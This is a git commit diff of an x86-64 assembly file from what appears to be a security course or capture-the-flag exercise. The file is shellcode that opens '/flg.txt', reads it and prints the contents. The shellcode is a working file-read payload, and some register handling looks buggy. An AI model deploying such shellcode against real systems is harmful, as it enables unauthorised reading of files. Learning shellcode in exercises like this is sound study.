4c122a579072f3849f1a9b675fdda36726cc9b57
juanan95mh <juananmh95@gmail.com>
2025-02-08 00:53:02 +0100

    ??

--- practicaFinal/flag.s
+++ practicaFinal/flag.s
@@ -1,27 +1,22 @@
 section .text
 _start:
     ; push './flg.txt\x00'
-    xor sil,sil
-    push si
-    push di               ; push NULL string terminator
-    mov rdi, '/flg.tx' 
+    mov rdi, 0x7478742e676c662f  ; "/flg.txt" en reversa
     push rdi
+    mov rdi, rsp                 ; move pointer to filename
 
-    
     ; open('rsp', 'O_RDONLY')
-    mov al, 2          ; open syscall number
-    mov rdi, rsp        ; move pointer to filename
+    mov al, 2                    ; open syscall number
     syscall
 
     ; read file
-    lea rsi, [rdi]      ; pointer to opened file
-    mov rdi, rax        ; set fd to rax from open syscall
-    xor al, al          ; read syscall number
-    mov dl, 24         ; size to read
+    mov rdi, rax                 ; set fd to rax from open syscall
+    mov rsi, rsp                 ; pointer to opened file
+    mov dl, 0x30                 ; size to read
+    xor al, al                   ; read syscall number
     syscall
 
     ; write output
-    mov al, 1          ; write syscall
-    mov dil, 1          ; set fd to stdout
-    mov dl, 24         ; size to read
+    mov al, 1                    ; write syscall
+    mov dil, 1                    ; set fd to stdout
     syscall
